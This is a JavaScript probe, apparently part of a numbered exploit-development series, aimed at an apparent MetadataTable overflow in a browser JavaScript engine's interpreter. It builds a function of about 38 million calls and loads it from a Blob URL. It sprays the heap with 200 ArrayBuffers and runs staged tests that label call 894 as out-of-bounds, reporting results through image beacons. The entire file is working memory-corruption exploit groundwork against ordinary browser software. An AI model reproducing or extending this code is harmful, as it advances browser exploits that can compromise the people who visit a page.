// p150j — MetadataTable overflow: minimal diagnostic
// p150e/p150i crash at C1-START before any callback fires.
// This probe tests: does the function crash with a no-op callback?
// Uses Image beacons (no sync XHR allocation) to minimize GC pressure.
// Beacon prefix: V150J-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150J-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  // Phase 1: Build function
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__ok=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    if (!window.__ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED');

    // === TEST 1: No-op callback, throw at 10 ===
    // If this crashes, the LLInt can't even execute the first op_call
    B('T1-START');
    var c1 = 0;
    try {
      window.__fn(function() {
        c1++;
        if (c1 >= 10) throw 'bail';
      });
    } catch(e) {}
    B('T1-CNT-' + c1);

    // === TEST 2: Pre-spray + no-op callback, throw at 960 ===
    // If T1 works but T2 doesn't, GC from spray causes the crash
    var abs = [];
    for (var i = 0; i < 200; i++) abs.push(new ArrayBuffer(100096));
    B('SPRAY-200');

    B('T2-START');
    var c2 = 0;
    try {
      window.__fn(function() {
        c2++;
        if (c2 >= 960) throw 'bail';
      });
    } catch(e) {}
    B('T2-CNT-' + c2);

    // === TEST 3: Second call on same function ===
    B('T3-START');
    var c3 = 0;
    try {
      window.__fn(function() {
        c3++;
        if (c3 >= 960) throw 'bail';
      });
    } catch(e) {}
    B('T3-CNT-' + c3);

    // === TEST 4: Call with beaconed callback, throw at 960 ===
    B('T4-START');
    var c4 = 0;
    try {
      window.__fn(function() {
        c4++;
        if (c4 === 1) B('T4-M1');
        if (c4 === 500) B('T4-M500');
        if (c4 === 893) B('T4-M893-LAST-IB');
        if (c4 === 894) B('T4-M894-OOB');
        if (c4 === 900) B('T4-M900');
        if (c4 === 950) B('T4-M950');
        if (c4 >= 960) throw 'bail';
      });
    } catch(e) {}
    B('T4-CNT-' + c4);

    B('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
